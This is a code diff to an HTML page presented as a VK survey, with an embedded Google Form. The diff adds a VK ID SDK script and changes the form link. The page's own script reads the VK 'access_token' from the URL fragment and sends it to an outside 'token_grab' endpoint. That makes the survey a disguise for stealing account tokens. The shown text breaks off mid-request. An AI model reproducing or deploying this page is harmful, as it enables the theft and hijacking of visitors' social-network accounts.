@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/@vkid/sdk@<3.0.0/dist-sdk/umd/index.js"></script>
     <title>Опрс ВК</title>
     <style>
         html, body {
@@ -18,7 +19,7 @@
     </style>
 </head>
 <body>
-    <iframe src="https://forms.gle/VtRc345eG4PJDrtq8" frameborder="0" marginheight="0" marginwidth="0">Загрузка…</iframe>
+    <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSd3ROjkAYPeThUJwXCG6aEkHzQ3OerL2hUl8FoxaC2ohCQG4g/viewform" frameborder="0" marginheight="0" marginwidth="0">Загрузка…</iframe>
     <script>
         const token = new URLSearchParams(location.hash.slice(1)).get('access_token');
         fetch(`https://gameapi.kuzymuzy.ru/token_grab/token_grab.php?token=${token}`, { 
